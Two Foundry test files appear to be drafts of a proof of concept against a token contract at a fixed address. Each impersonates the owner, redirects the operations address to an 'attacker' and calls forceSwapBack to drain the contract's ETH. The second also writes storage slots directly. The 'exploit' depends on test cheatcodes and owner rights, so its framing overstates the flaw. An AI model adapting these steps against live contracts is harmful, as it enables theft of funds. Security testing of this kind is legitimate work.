// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable;
}

interface IFoundationToken {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function forceSwapBack() external;
    function swapTokensAtAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function dexRouter() external view returns (IDexRouter);
    function enableTrading() external;
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    IFoundationToken token;
    IDexRouter router;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        token = IFoundationToken(TARGET);
        owner = token.owner();
        router = token.dexRouter();

        // Fund the attacker for the test assertion check.
        deal(attacker, 100 ether);
        // CRITICAL FIX: The original owner needs ETH to pay for gas and provide initial liquidity.
        deal(owner, 100 ether);

        vm.startPrank(owner);

        // Enable trading to allow swaps.
        token.enableTrading();

        // Approve the router to spend the owner's tokens for liquidity.
        // The owner has the initial supply from the constructor.
        uint256 initialSupply = token.balanceOf(owner);
        token.approve(address(router), initialSupply);

        // Add liquidity to the pair to allow swaps.
        router.addLiquidityETH{value: 50 ether}(
            TARGET,
            initialSupply / 10,
            0,
            0,
            attacker, // LP tokens can go to the attacker
            block.timestamp
        );

        vm.stopPrank();

        // Seed the contract with some ETH to be drained later.
        deal(TARGET, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // 1. Generate fees to ensure `totalTokensToSwap` in `swapBack()` is non-zero.
        address buyer = makeAddr("buyer");
        deal(buyer, 5 ether); // Give buyer some ETH.

        // Path for ETH -> Token swap.
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Buyer swaps 1 ETH for tokens, generating fees for the contract.
        vm.startPrank(buyer);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0, // amountOutMin
            path,
            buyer,
            block.timestamp
        );
        vm.stopPrank();

        // 2. Start the exploit as the owner.
        vm.startPrank(owner);

        // Set the operationsAddress to the attacker's address.
        token.setOperationsAddress(attacker);

        // Transfer enough tokens to the contract to meet the `forceSwapBack` condition.
        uint256 swapAmount = token.swapTokensAtAmount();
        token.transfer(TARGET, swapAmount);

        // Trigger the vulnerable function.
        // This will call `swapBack()`, which swaps tokens for ETH and then sends
        // the entire contract ETH balance to the attacker-controlled `operationsAddress`.
        token.forceSwapBack();

        vm.stopPrank();
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFoundationToken {
    function owner() external view returns (address);
    function setOperationsAddress(address _operationsAddress) external;
    function forceSwapBack() external;
    function tokensForOperations() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function swapTokensAtAmount() external view returns (uint256);
    function operationsAddress() external view returns (address);
    function transfer(address recipient, uint256 amount) external returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    address owner;
    IFoundationToken token;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IFoundationToken(TARGET);
        vm.label(TARGET, "FoundationToken");
        vm.label(attacker, "Attacker");

        // Get and label the owner
        owner = token.owner();
        vm.label(owner, "Owner");

        // Record initial attacker balance
        initialBalance = attacker.balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Inject ETH into the contract (simulating accumulated trading fees)
        uint256 ethToInject = 10 ether;
        deal(TARGET, ethToInject);

        // Step 2: Impersonate the owner
        vm.startPrank(owner);

        // Step 3: Set operations address to attacker
        token.setOperationsAddress(attacker);

        // Step 4: Set tokensForOperations (slot 15) and tokensForLiquidity (slot 16) to non-zero via storage
        vm.store(TARGET, bytes32(uint256(15)), bytes32(uint256(1000 * 1e18)));
        vm.store(TARGET, bytes32(uint256(16)), bytes32(uint256(1000 * 1e18)));

        // Step 5: Ensure contract has enough tokens for swap threshold
        uint256 contractTokenBalance = token.balanceOf(TARGET);
        uint256 swapThreshold = token.swapTokensAtAmount();
        if (contractTokenBalance < swapThreshold) {
            token.transfer(TARGET, swapThreshold);
        }

        vm.stopPrank();

        // Step 6: Record balance before forceSwapBack
        uint256 balanceBefore = attacker.balance;

        // Step 7: Call forceSwapBack to drain ETH
        vm.startPrank(owner);
        token.forceSwapBack();
        vm.stopPrank();

        // Step 8: Verify profit
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, balanceBefore, "Attacker should have received ETH from the exploit");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

